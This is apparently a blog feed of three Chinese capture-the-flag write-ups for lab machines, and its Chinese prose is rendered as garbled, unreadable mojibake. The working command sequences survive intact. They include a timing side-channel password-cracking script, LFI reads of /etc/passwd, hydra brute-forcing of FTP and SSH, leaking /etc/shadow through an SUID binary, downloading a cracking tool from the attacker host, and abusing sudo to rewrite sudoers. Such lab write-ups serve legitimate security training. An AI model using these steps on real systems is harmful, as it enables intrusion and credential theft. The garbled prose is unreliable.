black@Tea:~$ cat /home/red/user.txt
flag{user-9667c39f-4203-11f0-9e29-000c2955ba04}
```

# **‰∏â„ÄÅÊùÉÈôêÊèêÂçá**

## **ÂûÇÁõ¥ÊèêÂçáÔºöblack -&gt; root**

Âú® `/opt` ÁõÆÂΩï‰∏ãÂèëÁé∞‰∏Ä‰∏™Âêç‰∏∫ `check_root_passwd` ÁöÑÂèØÊâßË°åÊñá‰ª∂„ÄÇ

```bash
black@Tea:~$ ls -al /opt
-rwx--x--x 1 root root 16808 Jun 5 08:07 check_root_passwd
```

ÊâßË°åËØ•Á®ãÂ∫èÂπ∂Êèê‰æõ‰ªªÊÑèËæìÂÖ•ÔºåÂùáËøîÂõû 'Password error'„ÄÇÈÄöËøá `time` ÂëΩ‰ª§ÊµãËØïÂèëÁé∞ÔºåËæìÂÖ•ÁâπÂÆöÈïøÂ∫¶Ôºà10‰ΩçÔºâÊó∂ÔºåÁ®ãÂ∫èÁöÑÊâßË°åÊó∂Èó¥ÊúâÊòæËëóÂª∂ËøüÔºåËøôË°®ÊòéÂ≠òÂú®Êó∂Èó¥‰æß‰ø°ÈÅìÊîªÂáªÁöÑÂèØËÉΩÊÄß„ÄÇ

```bash
black@Tea:/opt$ for len in {1..12}; do inp=$(printf 'a%.0s' $(seq 1 $len)); printf 'Len:%2d -&gt; ' $len; (time ./check_root_passwd '$inp' &gt; /dev/null 2&gt;&amp;1) 2&gt;&amp;1 | grep -o 'real.*'; done
Len: 1 -&gt; real    0m0.000s
...
Len: 9 -&gt; real    0m0.000s
Len:10 -&gt; real    0m0.201s
Len:11 -&gt; real    0m0.000s
Len:12 -&gt; real    0m0.000s
```

Âü∫‰∫éÊ≠§ÂèëÁé∞ÔºåÂèØ‰ª•ÁºñÂÜôËÑöÊú¨ÈÄê‰ΩçÁàÜÁ†¥ÂØÜÁ†Å„ÄÇÂÖ∂ÂéüÁêÜÊòØÔºöÁ®ãÂ∫èÈÄêÂ≠óÁ¨¶ÊØîËæÉËæìÂÖ•‰∏éÁúüÂÆûÂØÜÁ†ÅÔºåÊØèÊ≠£Á°Æ‰∏Ä‰ΩçÔºåÊØîËæÉÊó∂Èó¥Â∞±‰ºöÁ®çÈïø‰∏Ä‰∫õ„ÄÇÈÄöËøáÊµãÈáèÊØè‰∏™Â≠óÁ¨¶ÁöÑÂìçÂ∫îÊó∂Èó¥ÔºåÂèØ‰ª•Á°ÆÂÆöÊ≠£Á°ÆÁöÑÂØÜÁ†Å„ÄÇ

‰ΩøÁî®‰ª•‰∏ã Shell ËÑöÊú¨ËøõË°åÁàÜÁ†¥ÔºöÔºàËøôËÑöÊú¨aiÂÜôÁöÑÔºåÂ∑®ÊÖ¢Ôºâ

```bash
P=''
for p in {0..9}; do
    LOG=/tmp/log.$p
    for c in {a..z}; do
        inp=$(printf '%-10s' '$P$c' | tr ' ' a | cut -c1-10)
        t=$( { time /opt/check_root_passwd '$inp' &gt;/dev/null 2&gt;&amp;1; } 2&gt;&amp;1 | grep real | awk -F'm' '{gsub(/s/,'',$2); print $2}' )
        echo '$c $t' &gt;&gt; $LOG
    done
    B=$(sort -k2 -nr $LOG | head -1 | awk '{print $1}')
    P+='$B'
    echo 'p$p: $B | total: $P'
done
echo '$P'
```

ÁªèËøáÁàÜÁ†¥ÔºåÂæóÂà∞ root ÂØÜÁ†Å‰∏∫ `toddzhennb`„ÄÇ

# **Âõõ„ÄÅÂ§∫ÂèñÊóóÂ∏ú**

‰ΩøÁî®Á†¥Ëß£Âá∫ÁöÑÂØÜÁ†ÅÂàáÊç¢Âà∞ `root` Áî®Êà∑„ÄÇ

```bash
black@Tea:/tmp$ su -
Password: toddzhennb
root@Tea:~# id
uid=0(root) gid=0(root) groups=0(root)
```

ÊúÄÂêéÔºåËØªÂèñ flagÔºåÂÆåÊàêÊ∏óÈÄè„ÄÇ

```bash
root@Tea:~# cat /root/root.txt /home/red/user.txt 
flag{root-06a5f218-4203-11f0-918d-000c2955ba04}
flag{user-9667c39f-4203-11f0-9e29-000c2955ba04}
```

# ‰∫î„ÄÅÈ¢òÂ§ñËØù

ÊàëÊâìÂÆåÊâçÂèëÁé∞ÔºåËøôÈù∂Êú∫Áæ§‰∏ªÂè´ÊàëÊµãËØïËøá

ÁÑ∂Âêé‰ªñÁöÑÊ†πÁõÆÂΩïÊúâ‰∏Ä‰∏™ËÑöÊú¨ÔºåÊØîÊàëËøôÂø´Â§ö‰∫ÜÔºåÊÉ≥‰∫ÜËß£‰∏Ä‰∏ãÁöÑÁúã‰∏ãÈù¢

```python
root@Tea:~# cat solve.py 
import subprocess
import sys
import time
import string

TARGET_PROGRAM = './a.out'
MAX_LENGTH = 100
INITIAL_DELAY = 0.2
CHAR_DELAY = 0.05
TIMING_MARGIN = 0.01
ATTEMPTS = 2
DETECT_THRESHOLD = 0.15
CHARSET = string.ascii_lowercase + string.digits

def run_password_test(password):
    start_time = time.perf_counter()
    process = subprocess.Popen(
        [TARGET_PROGRAM, password],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    _, _ = process.communicate()
    return time.perf_counter() - start_time

def detect_length():
    for length in range(1, MAX_LENGTH + 1):
        test_pwd = 'a' * length
        total_time = 0
        for _ in range(ATTEMPTS):
            elapsed = run_password_test(test_pwd)
            total_time += elapsed
        avg_time = total_time / ATTEMPTS
        
        if avg_time &gt;= DETECT_THRESHOLD:
            return length
    
    print('Password length not found (1-100)')
    sys.exit(1)

def crack_password(password_length):
    known = ''
    
    for position in range(password_length):
        max_time = 0
        best_char = None
        
        for char in CHARSET:
            test_pwd = known + char + 'x' * (password_length - len(known) - 1)
            
            current_time = 0
            for _ in range(ATTEMPTS):
                elapsed = run_password_test(test_pwd)
                if elapsed &gt; current_time:
                    current_time = elapsed
            
            print(f'Testing '{char}': {current_time:.4f}s')
            
            if current_time &gt; max_time:
                max_time = current_time
                best_char = char
        
        expected_time = INITIAL_DELAY + (position + 1) * CHAR_DELAY
        if abs(max_time - expected_time) &gt; TIMING_MARGIN:
            print(f'Warning: Position {position} timing anomaly ({max_time:.4f}s vs expected {expected_time:.4f}s)')
        
        known += best_char
        print(f'Progress: {known}')
    
    return known

if __name__ == '__main__':
    print('Starting password cracker...')
    print('Detecting password length...')
    password_length = detect_length()
    print(f'Password length detected: {password_length}')
    password = crack_password(password_length)
    print(f'\nPassword found: {password}')
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_tea.html</guid><pubDate>Wed, 06 Aug 2025 00:50:48 +0000</pubDate></item><item><title>hmv_Thirteen</title><link>https://7r1UMPHK.github.io/post/hmv_Thirteen.html</link><description>&gt; Tip
&gt;
&gt; Èù∂Êú∫Âú∞ÂùÄÔºöhttps://hackmyvm.eu/machines/machine.php?vm=Thirteen

# **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

## **1. ‰∏ªÊú∫ÂèëÁé∞**

È¶ñÂÖàÔºåÂú®Êú¨Âú∞ÁΩëÁªú‰∏≠‰ΩøÁî® `arp-scan` Â∑•ÂÖ∑Êâ´ÊèèÂ≠òÊ¥ª‰∏ªÊú∫ÔºåÁ°ÆÂÆöÁõÆÊ†áÈù∂Êú∫ÁöÑ IP Âú∞ÂùÄ‰∏∫ `192.168.205.250`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.250 08:00:27:c5:ec:3b       PCS Systemtechnik GmbH
...
```

## **2. Á´ØÂè£‰∏éÊúçÂä°Êâ´Êèè**

‰ΩøÁî® `nmap` ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºåÂèëÁé∞ÂÖ∂ÂºÄÊîæ‰∫Ü 21 (FTP)„ÄÅ22 (SSH) Âíå 80 (HTTP) ‰∏â‰∏™Á´ØÂè£„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p- 192.168.205.250
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 07:00 EDT
Nmap scan report for 192.168.205.250
Host is up (0.00012s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

## **3. Web ÊúçÂä°Êé¢Á¥¢**

ËÆøÈóÆ 80 Á´ØÂè£ÔºåÈ°µÈù¢ÊòæÁ§∫‰∏∫‰∏Ä‰∏™ 'iCloud Secure Vault'ÔºåÊèêÁ§∫ËæìÂÖ•Âä†ÂØÜË∑ØÂæÑÊù•ËÆøÈóÆÊñá‰ª∂„ÄÇÈ°µÈù¢‰∏äÊúâ‰∏â‰∏™ÈìæÊé•ÔºåÂÖ∂ `href` Â±ûÊÄßÊåáÂêë‰∫ÜÁªèËøá ROT13 Âä†ÂØÜÁöÑÊñá‰ª∂Âêç„ÄÇ

*   `?theme=jrypbzr.gkg` -&gt; `?theme=welcome.txt`
*   `?theme=pbasvt.gkg` -&gt; `?theme=config.txt`
*   `?theme=ernqzr.gkg` -&gt; `?theme=readme.txt`

ËøôË°®Êòé Web Â∫îÁî®Â≠òÂú®Êú¨Âú∞Êñá‰ª∂ÂåÖÂê´ (LFI) ÊºèÊ¥ûÔºåÈÄöËøá ROT13 Âä†ÂØÜÊûÑÈÄ† Payload Âç≥ÂèØËØªÂèñ‰ªªÊÑèÊñá‰ª∂„ÄÇÂà©Áî®ËØ•ÊºèÊ¥ûËØªÂèñ `/etc/passwd` Êñá‰ª∂Ôºå‰ª•ÂèëÁé∞Á≥ªÁªü‰∏äÁöÑÊúâÊïàÁî®Êà∑„ÄÇ

**ROT13 Âä†ÂØÜ `/etc/passwd` -&gt; `/rgp/cnffjq`**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl http://192.168.205.250/?theme=/rgp/cnffjq
...
welcome:x:1000:1000:,,,:/home/welcome:/bin/bash
max:x:1001:1001::/home/max:/bin/bash
...
```

‰ªéËøîÂõûÂÜÖÂÆπ‰∏≠ÔºåÊàë‰ª¨ËØÜÂà´Âá∫‰∏§‰∏™ÂèØÁôªÂΩïÁöÑÁî®Êà∑Ôºö`welcome` Âíå `max`„ÄÇ

## **4. FTP ÊúçÂä°Êé¢Á¥¢**

‰ΩøÁî® `hydra` ÂíåÈªòËÆ§Âá≠ÊçÆÂ≠óÂÖ∏ÂØπ FTP ÊúçÂä°ËøõË°åÁàÜÁ†¥ÔºåÊàêÂäüËé∑Âæó `ADMIN` Áî®Êà∑ÁöÑÂØÜÁ†Å‰∏∫ `12345`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.205.250 -I -u -f -e nsr -t 64
...
[21][ftp] host: 192.168.205.250   login: ADMIN   password: 12345
...
```

ÁôªÂΩï FTP ÊúçÂä°Âô®ÂêéÔºåÂèëÁé∞ `ftp_server.py` Âíå `rev.sh` ‰∏§‰∏™Êñá‰ª∂Ôºå‰ΩÜËøô‰∫õÊñá‰ª∂Âú®Ê≠§Ê¨°Ê∏óÈÄè‰∏≠Êú™Êèê‰æõÂÖ≥ÈîÆÂà©Áî®ÁÇπ„ÄÇ

# **‰∫å„ÄÅÂàùÂßãËÆøÈóÆ**

## **1. ÊºèÊ¥ûÂà©Áî®ÔºöSSH Âº±Âè£‰ª§ÁàÜÁ†¥**

ÈÄöËøáÂâçÈù¢ LFI ÊºèÊ¥ûËÆøÈóÆÂà∞ÁöÑ `welcome.txt` Êñá‰ª∂ÔºåÈáåÈù¢ÂåÖÂê´‰∏Ä‰∏™ÂêçÂ≠óÂàóË°®„ÄÇÊàë‰ª¨Â∞ÜËøô‰∏™ÂàóË°®‰∏é‰πãÂâçÂèëÁé∞ÁöÑÁî®Êà∑Âêç (`max`, `welcome`) ÁªìÂêàÔºå‰ΩøÁî® `cupp` Â∑•ÂÖ∑ÁîüÊàê‰∏Ä‰∏™ÈíàÂØπÊÄßÁöÑÂØÜÁ†ÅÂ≠óÂÖ∏ `user.cupp.txt`„ÄÇ

ÈöèÂêéÔºå‰ΩøÁî® `hydra` ÂØπ 22 Á´ØÂè£ÁöÑ SSH ÊúçÂä°ËøõË°åÂº±Âè£‰ª§ÁàÜÁ†¥„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cat user
max
welcome
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ hydra -L user -P user.cupp.txt ssh://192.168.205.250 -I -u -e nsr -t 64
...
[22][ssh] host: 192.168.205.250   login: max       password: Ellyas2018
[22][ssh] host: 192.168.205.250   login: welcome   password: Zakaria2020
...
```

ÁàÜÁ†¥ÊàêÂäüÔºåËé∑Âæó‰∏§ÁªÑÂá≠ÊçÆÔºö`max:Ellyas2018` Âíå `welcome:Zakaria2020`„ÄÇ

## **2. Ëé∑Âèñ Shell**

‰ΩøÁî® `max` Áî®Êà∑ÁöÑÂá≠ÊçÆÈÄöËøá SSH ÊàêÂäüÁôªÂΩïÂà∞ÁõÆÊ†áÁ≥ªÁªü„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ssh max@192.168.205.250
max@192.168.205.250's password: Ellyas2018
...
max@13max:~$ id
uid=1001(max) gid=1001(max) groups=1001(max)
```

# **‰∏â„ÄÅÊùÉÈôêÊèêÂçá**

## **1. Ê∞¥Âπ≥ÊèêÂçáÔºömax -&gt; welcome**

ÁôªÂΩï `max` Ë¥¶Êà∑ÂêéÔºåÈ¶ñÂÖàÊü•ÁúãÂΩìÂâçÁî®Êà∑ÊùÉÈôêÂíåÁ≥ªÁªü‰∏≠ÁöÑ SUID Êñá‰ª∂„ÄÇ

```bash
max@13max:~$ find / -perm -4000 -type f 2&gt;/dev/null
...
/usr/local/bin/supersuid
...
max@13max:~$ ls -la /usr/local/bin/supersuid
-rwsr-sr-- 1 root welcome 161488 Jul  4 10:37 /usr/local/bin/supersuid
```

ÂèëÁé∞‰∏Ä‰∏™Âêç‰∏∫ `supersuid` ÁöÑ SUID Êñá‰ª∂ÔºåÂÖ∂ÊâÄÊúâËÄÖ‰∏∫ `root`ÔºåÊâÄÂ±ûÁªÑ‰∏∫ `welcome`„ÄÇ`max` Áî®Êà∑‰∏çÂ±û‰∫é `welcome` ÁªÑÔºåÂõ†Ê≠§Êó†Ê≥ïÊâßË°åÊ≠§Êñá‰ª∂„ÄÇ

Âà©Áî®‰πãÂâçÁàÜÁ†¥Âá∫ÁöÑ `welcome` Áî®Êà∑ÂØÜÁ†Å `Zakaria2020`ÔºåÂàáÊç¢Âà∞ `welcome` Áî®Êà∑„ÄÇ

```bash
max@13max:~$ su welcome
Password: Zakaria2020
welcome@13max:~$ id
uid=1000(welcome) gid=1000(welcome),1001(max) groups=1000(welcome)
```

ÊàêÂäüÂàáÊç¢ÂêéÔºåÂú® `welcome` ÁöÑÂÆ∂ÁõÆÂΩï‰∏≠ÊâæÂà∞Âπ∂ËØªÂèñ `user.flag`„ÄÇ

```bash
welcome@13max:~$ cat /home/welcome/user.flag
flag{user-a89162ba751904d59ebd8fed2fce8880}
```

## **2. ÂûÇÁõ¥ÊèêÂçáÔºöwelcome -&gt; root**

ÂàáÊç¢Âà∞ `welcome` Áî®Êà∑ÂêéÔºåÊàë‰ª¨Áé∞Âú®ÊúâÊùÉÈôêÊâßË°å `/usr/local/bin/supersuid`„ÄÇÊâßË°åÂëΩ‰ª§‰πãÂêéÔºåÊ†πÊçÆÁªèÈ™å‰πãË∞àÂà§Êñ≠`supersuid`ÂÖ∂ÂÆûÊòØ`ss`ÂëΩ‰ª§ÁöÑÂ∞ÅË£ÖÔºåÈÄöËøáÊü•ËØ¢ GTFOBins ÔºåÂèØÁü• `ss` ÂëΩ‰ª§Âú® SUID ‰∏ä‰∏ãÊñá‰∏≠ÂèØ‰ª•Ë¢´Áî®Êù•ËØªÂèñ‰ªªÊÑèÊñá‰ª∂„ÄÇ

Âà©Áî®Ëøô‰∏™ÁâπÊÄßÔºåËØªÂèñ `/etc/shadow` Êñá‰ª∂ÔºåËé∑Âèñ `root` Áî®Êà∑ÁöÑÂØÜÁ†ÅÂìàÂ∏å„ÄÇ

```bash
welcome@13max:~$ /usr/local/bin/supersuid -a -F /etc/shadow
Error: an inet prefix is expected rather than 'root:$6$Cax26XI4SpAAItdE$7iVSsRoQT/o0b3.V9jMiljdau506ePGmZLkIl5JH9COngDqdXJkGnizRIhaLJu/JbwWZ.7XyF/MwzuDusZJcg1:20273:0:99999:7:::'.
Cannot parse dst/src address.
```

ËôΩÁÑ∂ÂëΩ‰ª§Êä•ÈîôÔºå‰ΩÜÈîôËØØ‰ø°ÊÅØ‰∏≠Â∑≤ÁªèÊ≥ÑÈú≤‰∫Ü `root` Áî®Êà∑ÁöÑÂìàÂ∏åÂÄº„ÄÇÂ∞ÜÂìàÂ∏å‰øùÂ≠òÂà∞Êú¨Âú∞Êñá‰ª∂ÔºåÂπ∂‰ΩøÁî® `john` Âíå `rockyou.txt` Â≠óÂÖ∏ËøõË°åÁ†¥Ëß£„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
...
april7th         (root)
...
```

ÊàêÂäüÁ†¥Ëß£Âá∫ `root` Áî®Êà∑ÁöÑÂØÜÁ†Å‰∏∫ `april7th`„ÄÇ

ÊúÄÂêéÔºå‰ΩøÁî® `su` ÂëΩ‰ª§ÂíåÁ†¥Ëß£ÁöÑÂØÜÁ†ÅÂàáÊç¢Âà∞ `root` Áî®Êà∑„ÄÇ

```bash
welcome@13max:~$ su -
Password: april7th
root@13max:~# id
uid=0(root) gid=0(root) groups=0(root)
```

# **Âõõ„ÄÅÂ§∫ÂèñÊóóÂ∏ú**

ÊàêÂäüËé∑Âèñ `root` ÊùÉÈôêÂêéÔºåËØªÂèñÂÖ®ÈÉ® `flag`„ÄÇ

```bash
root@13max:~# cat /root/root.flag /home/welcome/user.flag 
flag{root-aaa245a6e5a82937c985c50c86282892}
flag{user-a89162ba751904d59ebd8fed2fce8880}
```

Ëá≥Ê≠§ÔºåÊ∏óÈÄèÊµãËØïÂÆåÊàê„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Thirteen.html</guid><pubDate>Wed, 06 Aug 2025 00:50:19 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Chat</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Chat.html</link><description># **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

## **1. ‰∏ªÊú∫ÂèëÁé∞**

È¶ñÂÖàÔºåÂú®Êú¨Âú∞ÁΩëÁªú‰∏≠‰ΩøÁî® `arp-scan` Â∑•ÂÖ∑Êâ´ÊèèÂ≠òÊ¥ª‰∏ªÊú∫ÔºåÁ°ÆÂÆöÁõÆÊ†áÈù∂Êú∫ÁöÑ IP Âú∞ÂùÄ‰∏∫ `192.168.205.248`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.248 08:00:27:60:fd:c6       PCS Systemtechnik GmbH
...
```

## **2. Á´ØÂè£‰∏éÊúçÂä°Êâ´Êèè**

‰ΩøÁî® `nmap` ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÁ´ØÂè£ÂíåÊúçÂä°Êâ´ÊèèÔºåÂèëÁé∞ÂÖ∂ÂºÄÊîæ‰∫Ü 22 (ssh-chat)„ÄÅ2222 (OpenSSH) Âíå 8000 (HTTP) ‰∏â‰∏™Á´ØÂè£„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p22,2222,8000 -sC -sV 192.168.205.248
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 23:30 EDT
Nmap scan report for 192.168.205.248
Host is up (0.00033s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     (protocol 2.0)
| fingerprint-strings:
|_  NULL: SSH-2.0-Go ssh-chat
2222/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
8000/tcp open  http    Golang net/http server
|_http-title: /
...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

*   **22/tcp**: ‰∏Ä‰∏™Âü∫‰∫é Go ÁöÑ `ssh-chat` ÊúçÂä°„ÄÇ
*   **2222/tcp**: Ê†áÂáÜÁöÑ OpenSSH ÊúçÂä°ÔºåÊòØ‰∏ªË¶ÅÁöÑÁ™ÅÁ†¥Âè£„ÄÇ
*   **8000/tcp**: ‰∏Ä‰∏™Áî± Golang ÂÆûÁé∞ÁöÑ HTTP Êñá‰ª∂ÊúçÂä°Âô®„ÄÇ

### **3. Web ÊúçÂä°Êé¢Á¥¢**

ËÆøÈóÆ 8000 Á´ØÂè£ÔºåÂèëÁé∞ÊòØ‰∏Ä‰∏™Êñá‰ª∂ÁõÆÂΩïÊµèËßàÈ°µÈù¢„ÄÇÈÄöËøáÈ°µÈù¢ÂÜÖÂÆπÔºåÂèëÁé∞‰∫Ü‰∏Ä‰∏™ `.ssh` ÁõÆÂΩïÔºåËøôÈÄöÂ∏∏Â≠òÊîæÁî®Êà∑ÁöÑ SSH ÂØÜÈí•„ÄÇ

Âú® `.ssh` ÁõÆÂΩï‰∏≠ÔºåÊâæÂà∞‰∫ÜÁî®Êà∑ÁöÑÂÖ¨Èí• `authorized_keys` ÂíåÁßÅÈí• `id_rsa`„ÄÇÂ∞ÜÁßÅÈí•‰∏ãËΩΩÂà∞Êú¨Âú∞ÔºåÂ∞ùËØïÁî®‰∫éÂêéÁª≠ÁöÑÁôªÂΩï„ÄÇ

# **‰∫å„ÄÅÂàùÂßãËÆøÈóÆ**

## **1. ÊºèÊ¥ûÂà©Áî®ÔºöSSH Âº±Âè£‰ª§ÁàÜÁ†¥**

È¶ñÂÖàÂ∞ùËØï‰ΩøÁî®‰ªé Web ÊúçÂä°‰∏ãËΩΩÁöÑÁßÅÈí•ÁôªÂΩï 2222 Á´ØÂè£ÁöÑ SSH ÊúçÂä°Ôºå‰ΩÜ‰ª•Â§±Ë¥•ÂëäÁªà„ÄÇÈöèÂêéÔºåÂ∞ùËØïÁî®Âêå‰∏ÄÁßÅÈí•ÁôªÂΩïËøêË°åÂú® 22 Á´ØÂè£ÁöÑ ssh-chat ÊúçÂä°ÔºåËøôÊ¨°ÁôªÂΩïÊàêÂäü‰∫Ü„ÄÇ‰ΩÜÂú®Ëøõ‰∏ÄÊ≠•Êé¢Á¥¢‰∏≠ÔºåÂπ∂Êú™ÂèëÁé∞ÂÖ∂‰ªñÊúâ‰ª∑ÂÄºÁöÑÁ∫øÁ¥¢„ÄÇÂÄºÂæóÊ≥®ÊÑèÁöÑÊòØÔºå`ssh-chat` ÊúçÂä°ÁöÑÂΩìÂâçÁî®Êà∑‰∏∫ `scycree`Ôºå‰∏îÁôªÂΩïÊ®™ÂπÖ‰∏≠ÊèêÂà∞‰∫Ü`todd`ÔºåËøôÂèØËÉΩÊòØ‰∏Ä‰∏™ÈáçË¶ÅÊèêÁ§∫„ÄÇ

Âõ†Ê≠§ÔºåÂÜ≥ÂÆöÂØπ 2222 Á´ØÂè£ÁöÑ SSH ÊúçÂä°ËøõË°åÂº±Âè£‰ª§ÁàÜÁ†¥„ÄÇ‰ΩøÁî® `hydra` Â∑•ÂÖ∑Ôºå‰ª• `todd` Âíå `scycree` ‰∏∫Áî®Êà∑ÂêçÂ≠óÂÖ∏ÔºåÁªìÂêàÂ∏∏Áî®ÂØÜÁ†ÅÂ≠óÂÖ∏ËøõË°åÁàÜÁ†¥„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ cat user
todd
scycree
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ hydra -L user -P 5000q.txt ssh://192.168.205.248:2222 -I -u -f -e nsr -t 64
...
[2222][ssh] host: 192.168.205.248   login: todd   password: todd
...
```

ÁàÜÁ†¥ÊàêÂäüÔºåËé∑ÂæóÁî®Êà∑ `todd` ÁöÑÂØÜÁ†Å‰∏∫ `todd`„ÄÇ

## **2. Ëé∑Âèñ Shell**

‰ΩøÁî®Ëé∑ÂèñÁöÑÂá≠ÊçÆ `todd:todd` ÊàêÂäüÈÄöËøá SSH ÁôªÂΩïÂà∞ÁõÆÊ†áÁ≥ªÁªü„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ ssh todd@192.168.205.248 -p 2222
todd@192.168.205.248's password: todd
...
todd@Chat:~$ id
uid=1001(todd) gid=1001(todd) groups=1001(todd)
```

# **‰∏â„ÄÅÊùÉÈôêÊèêÂçá**

## **1. Ê∞¥Âπ≥ÊèêÂçáÔºötodd -&gt; scycree**

ÁôªÂΩï `todd` Ë¥¶Êà∑ÂêéÔºåÂèëÁé∞ÂΩìÂâçÊùÉÈôêËæÉ‰Ωé„ÄÇÁöÑÁõÆÊ†áÊòØÊèêÂçáËá≥ `root` ÊùÉÈôê„ÄÇÊ≥®ÊÑèÂà∞Á≥ªÁªü‰∏äËøòÂ≠òÂú®Âè¶‰∏Ä‰∏™Áî®Êà∑ `scycree`„ÄÇÂ∞ùËØïÁàÜÁ†¥ `scycree` Áî®Êà∑ÁöÑÂØÜÁ†Å„ÄÇ

È¶ñÂÖàÔºåÂ∞ÜÊú¨Âú∞ÁöÑÂØÜÁ†ÅÁàÜÁ†¥Â∑•ÂÖ∑ `suForce` ÂíåÂ≠óÂÖ∏ `rockyou.txt` ‰∏ä‰º†Âà∞Èù∂Êú∫ÁöÑ `/tmp` ÁõÆÂΩï„ÄÇ

```bash
todd@Chat:/tmp$ wget 192.168.205.128/suForce
todd@Chat:/tmp$ wget 192.168.205.128/rockyou.txt
todd@Chat:/tmp$ chmod +x suForce
```

ÁÑ∂ÂêéÊâßË°åÁàÜÁ†¥Ôºö

```bash
todd@Chat:/tmp$ ./suForce -u scycree -w rockyou.txt
...
üí• Password | welcome
...
```

ÊàêÂäüÁàÜÁ†¥Âá∫ `scycree` Áî®Êà∑ÁöÑÂØÜÁ†Å‰∏∫ `welcome`„ÄÇ‰ΩøÁî® `su` ÂëΩ‰ª§ÂàáÊç¢Âà∞ `scycree` Áî®Êà∑„ÄÇ

```bash
todd@Chat:/tmp$ su scycree
Password: welcome
scycree@Chat:/tmp$ id
uid=1000(scycree) gid=1000(scycree) groups=1000(scycree)
```

## **2. ÂûÇÁõ¥ÊèêÂçáÔºöscycree -&gt; root**

ÂàáÊç¢Âà∞ `scycree` Áî®Êà∑ÂêéÔºåÊâßË°å `sudo -l` Êü•ÁúãÂÖ∂ `sudo` ÊùÉÈôê„ÄÇ

```bash
scycree@Chat:/tmp$ sudo -l
Matching Defaults entries for scycree on Chat:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User scycree may run the following commands on Chat:
    (ALL) NOPASSWD: /usr/bin/ghfs
```

ÂèëÁé∞ `scycree` Áî®Êà∑ÂèØ‰ª•Êó†ÂØÜÁ†Å‰ª• `root` ÊùÉÈôêÊâßË°å `/usr/bin/ghfs` (Go HTTP File Server)„ÄÇ`ghfs` Â∏¶ÊúâÊñá‰ª∂‰∏ä‰º†ÂäüËÉΩÔºåËøôÊûÑÊàê‰∫Ü‰∏•ÈáçÁöÑÂÆâÂÖ®ÊºèÊ¥û„ÄÇÂèØ‰ª•Âà©Áî®Ëøô‰∏™ÊùÉÈôêÔºåÂêë `/etc/sudoers.d/` ÁõÆÂΩï‰∏ä‰º†‰∏Ä‰∏™ÊÅ∂ÊÑèÁöÑ `sudo` ÈÖçÁΩÆÊñá‰ª∂Ôºå‰ªéËÄåÊéà‰∫àËá™Â∑±ÂÆåÂÖ®ÁöÑ `root` ÊùÉÈôê„ÄÇ

È¶ñÂÖàÔºå‰ª• `root` ÊùÉÈôêÂêØÂä® `ghfs`ÔºåÂπ∂Â∞ÜÂÖ∂Ê†πÁõÆÂΩïÂíå‰∏ä‰º†ÁõÆÂΩïÈÉΩËÆæÁΩÆ‰∏∫ `/etc/sudoers.d/`„ÄÇ

```bash
scycree@Chat:/tmp$ sudo /usr/bin/ghfs -r /etc/sudoers.d/ --upload-dir /etc/sudoers.d/
```

Êé•ÁùÄÔºåÂú®Êú¨Âú∞ÂàõÂª∫‰∏Ä‰∏™Êñá‰ª∂ÔºåÂÜÖÂÆπ‰∏∫Ëµã‰∫à `scycree` Áî®Êà∑ÊâÄÊúâÂëΩ‰ª§ÁöÑÊó†ÂØÜÁ†Å `sudo` ÊùÉÈôê„ÄÇ

```bash
